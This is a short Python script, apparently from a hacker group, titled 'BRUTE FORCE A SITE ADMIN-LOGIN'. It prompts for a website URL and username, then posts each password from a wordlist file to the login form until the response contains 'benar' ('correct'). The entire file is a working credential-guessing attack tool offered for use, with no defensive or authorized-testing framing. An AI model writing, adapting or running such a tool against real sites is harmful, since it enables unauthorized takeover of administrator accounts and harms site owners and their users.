#coding by tegar sxc
#team: securityxploitcrew and tkj blackhats

import os
import requests

g = '\033[32;1m'
w = '\033[37;1m'
y = '\033[33;1m'

logo = ("""
\033[33;1m
╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═       ╔═╗╔╦╗╦  ╔═╗╔═╗
╠═╣ ║  ║ ╠═╣║  ╠╩╗  ───  ╠═╣ ║║║  ║ ║║ ╦
╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩       ╩ ╩═╩╝╩═╝╚═╝╚═╝
          \033[37;1mBRUTE FORCE A SITE ADMIN-LOGIN
""")
print(logo)
url = input( w + "website  : " + g)

user = input(w +"username : " + g)
password = open('password.txt','r')

for o in password.readlines():
        pw = o.strip()

        http = requests.post(url, data={'user':user, 'password':pw, 'submit':'submit'})
        k = http.content

        if "benar" in str(k):
          print( g + "succses : " + y,pw)
          break
        else:
          print( w + "none : " + g,pw)

